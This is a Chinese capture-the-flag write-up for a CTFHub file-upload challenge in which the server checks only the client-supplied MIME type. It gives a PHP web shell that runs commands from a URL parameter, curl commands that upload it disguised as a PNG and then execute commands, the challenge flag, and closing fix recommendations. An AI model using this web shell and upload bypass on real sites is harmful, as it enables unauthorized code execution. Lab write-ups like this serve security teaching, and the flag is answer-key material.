CTFHub - Web - 文件上传 - MIME验证

# CTFHub # Web # 文件上传 # MIME # RCE

一、题目信息

  • 题目名称：文件上传 - MIME验证
  • 题目方向：Web - 文件上传
  • 运行环境：PHP 7.3.14
  • 题目目标：绕过仅校验 MIME 类型的上传逻辑，执行 PHP 代码并读取 Flag。

二、漏洞分析

首页提供文件上传表单，服务端只检查请求体中的 Content-Type，没有结合文件扩展名、文件头和文件内容进行校验。客户端提交的 MIME 类型完全可控，因此可以把 PHP 文件伪装成 PNG 图片绕过检查。

上传目录为 upload/，文件会保留原始名称和扩展名，同时目录中的 PHP 文件能够被 Web 服务器解析，最终形成命令执行漏洞。

三、解题步骤

  1. 构造 PHP Payload：创建 mime_shell.php，通过 cmd 参数执行系统命令。 
    <?php
echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
?>
  2. 伪造 MIME 类型并上传：保留 .php 扩展名，在 multipart 请求中将文件类型声明为 image/png。 
    curl -F "submit=Submit" \
  -F "file=@mime_shell.php;filename=mime_shell.php;type=image/png" \
  "http://<challenge-host>:10800/"
    上传成功后返回： 
    upload/mime_shell.php
  3. 验证命令执行：访问上传文件并传入基础命令，确认服务端以 www-data 身份执行。 
    curl --get \
  --data-urlencode "cmd=id; pwd" \
  "http://<challenge-host>:10800/upload/mime_shell.php"
  4. 定位 Flag 文件：在 Web 根目录搜索包含 flag 的文件。 
    find /var/www/html -maxdepth 1 -type f -iname '*flag*'
    /var/www/html/flag_300521230.php
  5. 读取 Flag：Flag 位于 PHP 注释中，需要通过已获得的命令执行能力读取文件源码。 
    cat /var/www/html/flag_300521230.php
    <?php // ctfhub{b8b70ef68085b70b62553c7b}

四、最终 Flag

ctfhub{b8b70ef68085b70b62553c7b}

五、修复建议

  • 扩展名白名单：仅允许业务需要的安全扩展名，禁止上传 php、phtml 等可执行文件。
  • 校验文件内容：结合真实文件头、图片解析结果和 MIME 类型校验，不能信任客户端提交的 Content-Type。
  • 重命名存储：由服务端生成随机文件名和固定安全扩展名，不保留用户控制的文件名。
  • 隔离上传目录：将文件存放在 Web 根目录之外，并关闭上传目录的脚本执行权限。
  • 最小权限：限制 Web 服务账户对源码目录和系统命令的访问权限。
